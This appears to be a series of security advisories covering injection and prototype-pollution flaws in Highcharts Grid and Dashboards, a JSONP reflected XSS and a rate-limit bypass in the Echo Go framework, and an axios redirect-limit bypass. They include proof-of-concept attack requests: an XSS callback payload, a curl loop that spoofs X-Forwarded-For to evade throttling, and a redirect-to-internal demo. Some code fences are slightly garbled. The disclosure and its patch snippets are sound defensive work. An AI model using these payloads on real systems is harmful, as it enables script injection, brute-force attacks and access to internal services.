### Impact
The input-type cell renderers copy every entry of the renderer's `attributes` option onto the input or select element they create, without checking the attribute names. An attacker who controls the Grid configuration can supply entries under a column's `cells.renderer.attributes` or `cells.editMode.renderer.attributes` whose names are event handlers, and those handlers execute in the origin of the page hosting the Grid. A view renderer places the handler on the input rendered in every row of the column as soon as the Grid renders; an edit-mode renderer places it on the input created when a cell enters edit mode, and that input is focused immediately, so a `focus` handler runs as soon as the user starts editing. Exploitation requires that untrusted data reach the Grid configuration and that a user hover over or focus one of the rendered inputs, or begin editing a cell. The Pro DataGrid that shipped inside the Dashboards package is included.

### Workarounds

If your column configuration comes from a source you do not fully control, paste this snippet right after importing the `Grid` module:

```ts
const ALLOWED_RENDERER_ATTRIBUTES = [
    'autofocus', 'checked', 'max', 'maxlength', 'min', 'minlength',
    'multiple', 'pattern', 'placeholder', 'size', 'step'
];

const scrubColumn = (column) => {
    const cells = column?.cells;

    for (const renderer of [cells?.renderer, cells?.editMode?.renderer]) {
        const attributes = renderer?.attributes;

        if (attributes) {
            for (const key of Object.keys(attributes)) {
                if (!ALLOWED_RENDERER_ATTRIBUTES.includes(key.toLowerCase())) {
                    delete attributes[key];
                }
            }
        }
    }

    return column;
};

const scrubOptions = (options) => {
    scrubColumn(options?.columnDefaults);
    (options?.columns || []).forEach(scrubColumn);
    return options;
};

const proto = Grid.Grid.prototype;

const loadUserOptions = proto.loadUserOptions;
proto.loadUserOptions = function (options, ...rest) {
    scrubOptions(Grid.defaultOptions);
    return loadUserOptions.call(this, scrubOptions(options), ...rest);
};

const updateColumn = proto.updateColumn;
proto.updateColumn = function (columnId, options, ...rest) {
    return updateColumn.call(this, columnId, scrubColumn(options), ...rest);
};
```

### Obtaining the patched version
The patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/grid-lite@3.2.0`. If you load Highcharts Grid from a CDN, use a versioned URL, for example `https://cdn.jsdelivr.net/npm/@highcharts/grid-lite@3.2.0/grid-lite.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/grid/installation).

### Impact
A custom icon supplied under `rendering.icons` as an icon definition object is built by creating an SVG path for each of its child entries and setting every key of that entry as an attribute of the path, without filtering the attribute names; only the string form of the option is passed through the markup allow-list. An attacker who controls the Grid configuration can therefore supply child entries whose keys name event handlers, and those handlers execute in the origin of the page hosting the Grid. Custom icons take precedence over the built-in ones, so the attacker can replace icons that render without any further configuration, such as the sort icon shown in every column header by default and the pagination controls where pagination is enabled, and does not need any reference to a custom icon name. Exploitation requires that untrusted data reach the Grid configuration and that a user hover over or activate an affected icon.

### Workarounds
If your Grid configuration comes from a source you do not fully control, paste this snippet right after importing the Grid module:

```ts
(function () {
    const GridNS = typeof Grid !== 'undefined' ? Grid : undefined;
    const GridClass = GridNS && GridNS.Grid;

    if (!GridClass || !GridClass.prototype.loadUserOptions) {
        return; // Grid not loaded
    }

    const allowedPathAttributes = [
        'd',
        'fill',
        'opacity',
        'stroke',
        'stroke-width',
        'stroke-linecap',
        'stroke-linejoin',
        'transform'
    ];

    const originalLoadUserOptions = GridClass.prototype.loadUserOptions;

    function sanitizeIconValue(value) {
        if (!value || typeof value === 'string') {
            return value;
        }

        const children = value.children || [];
        const sanitizedChildren = [];

        for (let i = 0; i < children.length; i++) {
            const child = children[i] || {};
            const clean = {};

            for (let j = 0; j < allowedPathAttributes.length; j++) {
                const attr = allowedPathAttributes[j];
                if (child[attr] !== undefined && child[attr] !== null) {
                    clean[attr] = child[attr];
                }
            }

            sanitizedChildren.push(clean);
        }

        return {
            width: value.width,
            height: value.height,
            viewBox: value.viewBox,
            fill: value.fill,
            children: sanitizedChildren
        };
    }

    function sanitizeIconsMap(icons) {
        if (!icons) {
            return icons;
        }

        const out = {};
        for (const key in icons) {
            if (Object.prototype.hasOwnProperty.call(icons, key)) {
                out[key] = sanitizeIconValue(icons[key]);
            }
        }
        return out;
    }

    GridClass.prototype.loadUserOptions = function (newOptions) {
        if (
            newOptions &&
            newOptions.rendering &&
            newOptions.rendering.icons
        ) {
            newOptions.rendering.icons = sanitizeIconsMap(
                newOptions.rendering.icons
            );
        }

        return originalLoadUserOptions.apply(this, arguments);
    };
}());
```

### Obtaining the patched version
The patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/grid-lite@3.2.0`. If you load Highcharts Grid from a CDN, use a versioned URL, for example `https://cdn.jsdelivr.net/npm/@highcharts/grid-lite@3.2.0/grid-lite.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/grid/installation).

### Impact
The Highcharts component uses the value of `chartConstructor` to select a function from the Highcharts namespace and invokes it with the component's container element and its `chartOptions`, without checking the value against the supported chart constructors. An attacker who controls the dashboard configuration can therefore name any other public member of that namespace; utility functions in that namespace copy the supplied options onto the container element as properties or attributes, so markup and event handlers carried in `chartOptions` land in the page and run in the origin of the page hosting the dashboard. Exploitation requires that untrusted data reach the Dashboards component configuration. No user interaction is required beyond rendering the board.

### Workarounds
If your board configuration comes from a source you do not fully control, paste this snippet right after importing libraries:
```ts
(function () {
    const HighchartsComponent =
        Dashboards && Dashboards.HighchartsComponent;

    if (!HighchartsComponent || !HighchartsComponent.prototype.createChart) {
        return; // HighchartsComponent not loaded
    }

    const allowedConstructors = [
        'chart',
        'stockChart',
        'mapChart',
        'ganttChart'
    ];
    const originalCreateChart = HighchartsComponent.prototype.createChart;

    HighchartsComponent.prototype.createChart = function () {
        if (allowedConstructors.indexOf(this.chartConstructor) === -1) {
            this.chartConstructor = 'chart';
        }

        return originalCreateChart.apply(this, arguments);
    };
}());
```

### Obtaining the patched version
The patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/dashboards@4.2.2`. If you load Highcharts Dashboards from a CDN, use a versioned URL, for example `https://code.highcharts.com/dashboards/4.2.2/dashboards.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/dashboards/installation).

### Impact
When a single cell value is written to a data table, the column id is used as a key on the table's column collection without filtering, so a column id of `__proto__` resolves to `Object.prototype`, is taken for an existing column, and the write lands at the row index on `Object.prototype`; a column id of `constructor` writes onto the `Object` constructor in the same way. In Dashboards releases that still supported column aliases, the id is first resolved through the alias map, so a literal `__proto__` id is redirected harmlessly there, while an alias whose target is `__proto__`, which the connector's data table options accept, reaches the same write. An attacker who controls the column id can thereby set integer-keyed properties on `Object.prototype`, one per row index, holding the written value; named properties cannot be reached through these paths, because the row index is a number. The integer keys still affect every object in the page: reading an out-of-range index on any array or plain object returns the injected value, and `for...in` over any object yields the injected keys, so unrelated code can take branches it should not using attacker-supplied data, and rendering can fail as a side effect. In Dashboards the write is reached through the Highcharts component's connector write-back, which is enabled by default through `allowConnectorUpdate` and takes the column id from the component's `columnAssignment`, or in the earliest releases from the series name, when a point is updated; in Grid Pro it is reached through cell editing in earlier releases and remains reachable through the public `DataTable` API. Exploitation requires that untrusted data reach the board or Grid configuration and that a point be updated or a cell edited, or that the application write a cell with an untrusted column id.

Consequences beyond disruption depend on the consuming application.

### Workarounds
Two measures are needed. The first closes the paths that reach `Object.prototype`; the second covers table construction, which cannot be patched from outside the library.

#### 1. Strip unsafe keys from untrusted column data

Apply this wherever column data enters your application, before it is handed to a grid, board or `DataTable`. This is the only measure that covers the `DataTable` constructor.

```js
function stripUnsafeColumnIds(columns) {
    for (const key of ['__proto__', 'constructor']) {
        if (Object.prototype.hasOwnProperty.call(columns, key)) {
            delete columns[key];
        }
    }

    return columns;
}

Grid.grid('container', {
    data: { columns: stripUnsafeColumnIds(untrustedColumns) }
});
```

#### 2. Patch the DataTable methods

Needed if your application passes column ids that originate from untrusted input to `setCell`, `changeColumnId` or `setColumns`. Run it once at startup.

```js
{
    const { DataTable } = Grid; // Or Dashboards

    if (!DataTable) {
        throw new Error('Patch loaded before Grid');
    }

    const unsafe = (id) => id === '__proto__' || id === 'constructor';

    const setCell = DataTable.prototype.setCell;
    DataTable.prototype.setCell = function (columnId, ...rest) {
        if (unsafe(columnId)) {
            return;
        }
        return setCell.call(this, columnId, ...rest);
    };

    const changeColumnId = DataTable.prototype.changeColumnId;
    DataTable.prototype.changeColumnId = function (columnId, newColumnId) {
        if (unsafe(columnId) || unsafe(newColumnId)) {
            return false;
        }
        return changeColumnId.call(this, columnId, newColumnId);
    };

    const setColumns = DataTable.prototype.setColumns;
    DataTable.prototype.setColumns = function (columns, ...rest) {
        const safe = {};

        for (const key of Object.keys(columns || {})) {
            if (!unsafe(key)) {
                safe[key] = columns[key];
            }
        }

        return setColumns.call(this, safe, ...rest);
    };
}
```

For npm, take `DataTable` from your import instead of the global — it is exported by Grid Lite, Grid Pro and Dashboards alike.

### Obtaining the patched version
The patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install @highcharts/dashboards@4.2.2`. If you load Highcharts Dashboards from a CDN, use a versioned URL, for example `https://code.highcharts.com/dashboards/4.2.2/dashboards.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/dashboards/installation).

### Summary

The `Context.JSONP`, `Context.JSONPBlob`, and internal `jsonPBlob` helper in `context.go` directly concatenate the caller-supplied `callback` parameter into a JavaScript response **without any validation, escaping, or allow-listing**.  

This creates a high-impact **reflected XSS** that can be triggered by any route passing attacker-controlled data (query string, form, header, path param, etc.) into the callback.

**Present in current master and v5.1.0 (latest release).**

### Vulnerable Code (verbatim)

```go
func (c *Context) jsonPBlob(code int, callback string, i any) (err error) {
	c.writeContentType(MIMEApplicationJavaScriptCharsetUTF8)
	c.response.WriteHeader(code)
	if _, err = c.response.Write([]byte(callback + "(")); err != nil {
		return
	}
	if err = c.echo.JSONSerializer.Serialize(c, i, ""); err != nil {
		return
	}
	if _, err = c.response.Write([]byte(");")); err != nil {
		return
	}
	return
}

func (c *Context) JSONP(code int, callback string, i any) (err error) {
	return c.jsonPBlob(code, callback, i)
}

func (c *Context) JSONPBlob(code int, callback string, b []byte) (err error) {
	c.writeContentType(MIMEApplicationJavaScriptCharsetUTF8)
	c.response.WriteHeader(code)
	if _, err = c.response.Write([]byte(callback + "(")); err != nil {
		return
	}
	if _, err = c.response.Write(b); err != nil {
		return
	}
	_, err = c.response.Write([]byte(");"))
	return
}
```
No sanitization is performed on the callback string.

### Exploit (one-request repro)
Any route using the official pattern is vulnerable:
```
Goe.GET("/api", func(c echo.Context) error {
    return c.JSONP(200, c.QueryParam("callback"), map[string]string{"status": "ok"})
})
```
Attacker request:
```
GET /api?callback=alert(document.domain)%2f%2f HTTP/1.1
Host: target.com
```
Server response:
```
Content-Type: application/javascript; charset=utf-8

alert(document.domain)//({"status":"ok"});
```
→ Immediate arbitrary JavaScript execution (full reflected XSS).
### Impact

- Session hijacking, cookie theft, account takeover, keylogging, defacement.
- Works even with strict CSP (response is served as application/javascript).

#### Affected Versions

- All versions ��� v5.1.0 (including current master)

#### Workarounds
Manually sanitize the callback before calling JSONP/JSONPBlob:
```
Gofunc safeCallback(cb string) string {
    if matched, _ := regexp.MatchString(`^[a-zA-Z0-9_.\[\]]+$`, cb); !matched {
        return "callback"
    }
    return cb
}
```
Or migrate away from JSONP entirely (use CORS + application/json).
### References

- https://github.com/labstack/echo/blob/master/context.go
- https://echo.labstack.com/docs/cookbook/jsonp

## Patches

Fixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. `Context.JSONP` and `Context.JSONPBlob` accept only a callback that is empty, a JavaScript identifier or a dot-separated path of identifiers (ASCII letters, digits, `_` and `$`); any other callback returns a 400 Bad Request error wrapping `ErrInvalidJSONPCallback` and nothing is written. JSONP responses also carry `X-Content-Type-Options: nosniff`.

## Workarounds

Validate the callback in your handler before calling `Context.JSONP`, for example against `^[A-Za-z_$][A-Za-z0-9_$]*(\.[A-Za-z_$][A-Za-z0-9_$]*)*$`, and set `X-Content-Type-Options: nosniff`. JSONP responses can be read by any website with the user's cookies, so do not serve data that requires authentication through JSONP.

## Summary

When `echo.New()` is used without explicitly setting `Echo#IPExtractor`, the `RealIP()` method falls back to reading the client-supplied `X-Forwarded-For` (or `X-Real-IP`) header without any proxy-origin validation. The default `RateLimiter()` middleware derives its per-client identifier from `ctx.RealIP()`, so an attacker can rotate arbitrary values in the `X-Forwarded-For` header on each request to obtain a fresh rate-limit bucket and bypass IP-based throttling entirely.

## Affected Component

- `context.go` — `(*Context).RealIP()` (lines 186–208), legacy fallback branch (lines 190–200)
- `middleware/rate_limiter.go` — `DefaultRateLimiterConfig.IdentifierExtractor` (lines 46–58); `RateLimiter()` (lines 71–76)
- `echo.go` — `New()` (lines 326–343), `IPExtractor` left `nil` by default

## Description

### `RealIP()` unconditionally trusts `X-Forwarded-For` when `IPExtractor` is unset

`Context.RealIP()` (`context.go:186-208`) first checks `c.echo.IPExtractor`. When this field is `nil` (the default for `echo.New()`), it falls through to legacy behavior and returns the **first IP** from the `X-Forwarded-For` header — the position an attacker has full control over:

```go
// context.go:186-200
func (c *Context) RealIP() string {
    if c.echo != nil && c.echo.IPExtractor != nil {
        return c.echo.IPExtractor(c.request)
    }
    // Fall back to legacy behavior
    if ip := c.request.Header.Get(HeaderXForwardedFor); ip != "" {
        i := strings.IndexAny(ip, ",")
        if i > 0 {
            xffip := strings.TrimSpace(ip[:i])
            xffip = strings.TrimPrefix(xffip, "[")
            xffip = strings.TrimSuffix(xffip, "]")
            return xffip   // ← attacker-controlled first IP
        }
        return ip
    }
    if ip := c.request.Header.Get(HeaderXRealIP); ip != "" {
        ...
        return ip          // ← also attacker-controlled
    }
    ra, _, _ := net.SplitHostPort(c.request.RemoteAddr)
    return ra
}
```

### Rate limiter default identifier extractor calls `RealIP()` unconditionally

`DefaultRateLimiterConfig` (`rate_limiter.go:46-58`) sets the identifier extractor to `ctx.RealIP()` with no guard for whether a safe `IPExtractor` is configured:

```go
// rate_limiter.go:46-58
var DefaultRateLimiterConfig = RateLimiterConfig{
    Skipper: DefaultSkipper,
    IdentifierExtractor: func(ctx *echo.Context) (string, error) {
        id := ctx.RealIP()   // ← reads attacker-controlled header
        return id, nil
    },
    ...
}
```

`RateLimiter(store)` (`rate_limiter.go:71-76`) copies `DefaultRateLimiterConfig` directly:

```go
// rate_limiter.go:71-76
func RateLimiter(store RateLimiterStore) echo.MiddlewareFunc {
    config := DefaultRateLimiterConfig
    config.Store = store
    return RateLimiterWithConfig(config)
}
```

The result is that the most common usage pattern — `e.GET("/path", h, middleware.RateLimiter(store))` — produces a rate limiter whose per-client identifier is fully controlled by the requester.

### Framework acknowledges the issue for IP extraction but the rate limiter carries no warning

`ip.go:27` explicitly states the default is insecure:

> "Note: if you don't set `Echo#IPExtractor` explicitly, Echo fallback to legacy behavior, which is not a good choice."

And `ip.go:117-119`:

> "In default behavior, Echo sees all of first XFF header, X-Real-IP header and IP from network layer. As you might already notice, after reading this article, this is not good. Sole reason this is default is just backward compatibility."

The `IPExtractor` mechanism (`ExtractIPDirect()`, `ExtractIPFromXFFHeader()`, `ExtractIPFromRealIPHeader()`) in `ip.go` exists precisely to close this gap. However, the `RateLimiter()` function and `DefaultRateLimiterConfig` have **no corresponding warning** and make no attempt to detect or flag that `IPExtractor` is unset, leaving operators who follow the standard rate limiter example silently exposed.

The test `TestRateLimiterWithConfig_defaultConfig` (`rate_limiter_test.go:181-226`) itself drives the rate limiter by setting `X-Real-IP` directly on the test request — demonstrating that the identifier is freely injectable without comment or mitigation.

### Full execution chain

1. Server starts with `echo.New()` (no `IPExtractor` set) and `e.GET("/limited", h, middleware.RateLimiter(store))`
2. Attacker sends `GET /limited` with header `X-Forwarded-For: 1.2.3.4` — rate bucket for `1.2.3.4` consumed
3. Attacker sends `GET /limited` again with `X-Forwarded-For: 1.2.3.4` — second token consumed; if burst is 1, next request would be 429
4. Attacker sends `GET /limited` with `X-Forwarded-For: 5.6.7.8` — **new bucket created** for `5.6.7.8`, 200 OK returned
5. Attacker repeats step 4 with arbitrary IPs — rate limit never triggers; unlimited requests served

## Proof of Concept

```go
package main

import (
    "net/http"
    echo "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    // NOTE: IPExtractor deliberately NOT set — this is the default
    store := middleware.NewRateLimiterMemoryStore(1)
    e.GET("/limited", func(c *echo.Context) error {
        return c.String(http.StatusOK, "ok")
    }, middleware.RateLimiter(store))
    e.Logger.Fatal(e.Start(":1324"))
}
```

```bash
# First request with IP 1.1.1.1 — consumes burst token
curl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited
# HTTP/1.1 200 OK

# Second request with same IP — rate limited
curl -i -H 'X-Forwarded-For: 1.1.1.1' http://127.0.0.1:1324/limited
# HTTP/1.1 429 Too Many Requests

# Third request with DIFFERENT spoofed IP — bypass: new bucket, 200 OK
curl -i -H 'X-Forwarded-For: 2.2.2.2' http://127.0.0.1:1324/limited
# HTTP/1.1 200 OK

# Repeat indefinitely with rotating IPs — rate limit never triggers
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" -H "X-Forwarded-For: 10.0.0.$i" http://127.0.0.1:1324/limited
done
# 200 200 200 ... (all 200, never 429)
```

## Impact

- Attackers can make unlimited requests to any endpoint protected by `middleware.RateLimiter()` using the default configuration by rotating the `X-Forwarded-For` header
- Brute-force attacks against login, password reset, 2FA, and similar authentication endpoints are unthrottled
- API abuse and credential stuffing are possible at arbitrary throughput
- Any per-IP security control that relies on `ctx.RealIP()` with default configuration (access logging, geo-blocking, audit trails) is equally undermined

## Recommended Remediation

### Option 1: Require explicit `IPExtractor` configuration in `RateLimiter()` (preferred)

The `RateLimiter()` convenience function should detect when `IPExtractor` is not configured and either panic with a clear message or fall back to `ExtractIPDirect()` (direct-connection IP only):

```go
// rate_limiter.go — illustrative change
var DefaultRateLimiterConfig = RateLimiterConfig{
    Skipper: DefaultSkipper,
    IdentifierExtractor: func(ctx *echo.Context) (string, error) {
        if ctx.Echo().IPExtractor == nil {
            // Fall back to direct TCP peer address — safe for non-proxied deployments
            host, _, err := net.SplitHostPort(ctx.Request().RemoteAddr)
            if err != nil {
                return ctx.Request().RemoteAddr, nil
            }
            return host, nil
        }
        return ctx.RealIP(), nil
    },
    ...
}
```

### Option 2: Document and warn in `RateLimiter()` godoc

At minimum, add a prominent warning to the `RateLimiter()` and `DefaultRateLimiterConfig` documentation directing users to configure `Echo#IPExtractor` before using IP-based rate limiting, mirroring the guidance already present in `ip.go`.

```go
// RateLimiter returns a rate limiting middleware.
//
// SECURITY: The default IdentifierExtractor uses ctx.RealIP(), which reads
// X-Forwarded-For / X-Real-IP headers. Without setting Echo#IPExtractor,
// these headers are fully client-controlled and can be spoofed to bypass
// rate limiting. Set e.IPExtractor = echo.ExtractIPDirect() (no proxy) or
// echo.ExtractIPFromXFFHeader() (trusted proxy) before using this middleware.
// See https://echo.labstack.com/guide/ip-address for details.
func RateLimiter(store RateLimiterStore) echo.MiddlewareFunc {
```

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## Patches

Fixed in `github.com/labstack/echo/v5` v5.1.0: without `Echo#IPExtractor`, `Context.RealIP()` returns the address of the direct peer; the previous behavior is available as `LegacyIPExtractor`.

`github.com/labstack/echo/v4` keeps its default for compatibility.

## Workarounds

Configure `Echo#IPExtractor` for your deployment (`echo.ExtractIPDirect()` without a proxy, `echo.ExtractIPFromXFFHeader()` behind proxies, with `TrustIPRange` for proxies on public addresses), or set `RateLimiterConfig.IdentifierExtractor` to an identifier that clients cannot choose.

## Summary

Axios exposes `maxRedirects` to limit redirect following, and `maxRedirects: 0` is used by applications as a redirect-based SSRF guard. The Node HTTP adapter enforces this option. The fetch adapter does not read it and does not set a Fetch API `redirect` mode, so the runtime default of `redirect: 'follow'` applies.

Applications are affected when they rely on `maxRedirects: 0` and use the fetch adapter, either explicitly or because the runtime selects it.

## Impact

An attacker who controls the initial URL or a redirecting server can cause a fetch-adapter request to follow a redirect even though the caller configured `maxRedirects: 0`. If the redirect target is reachable only from the application environment, this can expose internal responses or trigger state-changing internal endpoints.

This should not be described as unconditional SSRF. The bypass requires a redirect source, such as an attacker-controlled server or open redirect, and an application that trusted `maxRedirects: 0` as the redirect guard.

## Affected Functionality

Affected:

- `adapter: 'fetch'`.
- Runtime environments where fetch is selected by adapter resolution.
- Requests configured with `maxRedirects: 0` but without `fetchOptions.redirect: 'manual'` or equivalent runtime-specific redirect control.

Not affected:

- Node HTTP adapter, which enforces `maxRedirects: 0`.
- Requests that do not follow redirects in the underlying fetch implementation because the caller explicitly configured fetch redirect behavior.

## Technical Details

`lib/adapters/fetch.js` destructures many fields from `resolveConfig(config)`, but not `maxRedirects`. It then builds fetch options without a `redirect` key:

```js
const resolvedOptions = {
  ...fetchOptions,
  signal: composedSignal,
  method: method.toUpperCase(),
  headers: toByteStringHeaderObject(headers.normalize()),
  body: data,
  duplex: 'half',
  credentials: isCredentialsSupported ? withCredentials : undefined,
};
```

Because `redirect` is absent, the Fetch API default is to follow redirects.

Local verification on axios `1.18.1` showed the HTTP adapter throwing with `maxRedirects: 0`, while the fetch adapter followed the same loopback `302` and returned the internal response.

## Proof of Concept of Attack

Constrained local demonstration:

1. Start server A that returns `302 Location: http://127.0.0.1:<server-b>/internal`.
2. Start server B that returns `INTERNAL`.
3. Compare:

```js
await axios.get(serverA, { adapter: 'http', maxRedirects: 0 });  // throws
await axios.get(serverA, { adapter: 'fetch', maxRedirects: 0 }); // returns INTERNAL
```

## Workarounds

For fetch-adapter requests, set `fetchOptions: { redirect: 'manual' }` where the runtime supports it, or use the Node HTTP adapter for requests that rely on axios redirect limits.

